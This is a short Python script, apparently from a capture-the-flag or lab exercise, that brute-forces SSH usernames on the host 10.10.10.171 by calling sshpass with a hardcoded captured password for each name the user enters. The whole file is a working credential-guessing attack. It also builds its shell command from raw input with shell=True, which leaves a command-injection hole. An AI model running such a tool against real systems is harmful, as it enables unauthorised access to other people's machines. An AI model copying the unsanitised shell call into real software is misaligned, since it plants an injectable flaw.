# This script is used to find the correct username for an already captured password
# sshpass should be installed for it to run. 

import subprocess
import time

print("Enter the list of usernames separated by spaces")
list_usernames = str(input())

list_usernames = list_usernames.split(" ")

for username in list_usernames:
    ssh_call = "ssh " + username + "@10.10.10.171"
    subprocess.call("sshpass -p n1nj4W4rri0R! " + ssh_call, shell=True)
    time.sleep(1)
    
